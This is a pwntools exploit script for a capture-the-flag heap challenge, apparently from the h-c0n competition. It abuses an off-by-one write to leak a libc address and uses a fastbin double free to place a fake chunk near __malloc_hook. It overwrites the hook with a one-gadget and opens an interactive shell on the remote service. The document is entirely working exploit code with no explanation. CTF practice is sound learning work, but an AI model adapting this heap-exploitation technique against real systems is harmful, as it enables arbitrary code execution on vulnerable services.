#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
BINARY = './chall'
HOST, PORT = 'ctf.h-c0n.com', 60003

libc = ELF('./libc-cont.so')

context.log_level = 'debug'

def add(index, size, content):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('Paper\'s index: ', str(index))
    p.sendlineafter('Paper\'s size: ', str(size))
    p.sendlineafter('Paper\'s content: ', content)

def show(index):
    p.sendlineafter('>> ', '4')
    p.sendlineafter('Paper\'s index: ', str(index))

def free(index):
    p.sendlineafter('>> ', '3')
    p.sendlineafter('Paper\'s index: ', str(index))

def start():
    if not args.REMOTE:
    	return process(BINARY)
    else:
    	return remote(HOST, PORT)

def fix_typo(index, pos, char):
    p.sendlineafter('>> ', '2')
    p.sendlineafter('Paper\'s index: ', str(index))
    p.sendlineafter('Which typo do you want to fix?: ', str(pos))
    p.sendlineafter('Fix\'s content: ', char)

p = start()

for i in range(7):
	add(2, 128, "7"*128)
	free(2)

add(0, 24, "A"*24)
add(1, 128, "B"*128)
add(2, 24, "C"*24)
free(1)
fix_typo(0, 24, '\x93')
add(1, 128, "d"*7)

p.sendlineafter('>> ', '4')
p.sendlineafter('Paper\'s index: ', "1")
p.recvuntil('d' * 7 + '\n')
leak = p.recv(6) + '\x00\x00'

libcDir = u64(leak) - libc.sym['__malloc_hook'] - 112
fakeChunk = libcDir + libc.sym['__malloc_hook'] - 0x23
oneGadget = libcDir + 0x106ef8

for i in range(7):
	add(2, 96, "R"*96)
	free(2)

add(0, 96, "S"*96)
add(1, 96, "T"*96)
free(0)
free(1)
free(0)
add(1, 96, p64(fakeChunk) + "U"*88)
add(1, 96, "X"*96)
add(1, 96, "Y"*96)
add(0,96, 'i' * 19 + p64(oneGadget) + "\x00"*20)
p.interactive()

add(2,1,'\n')







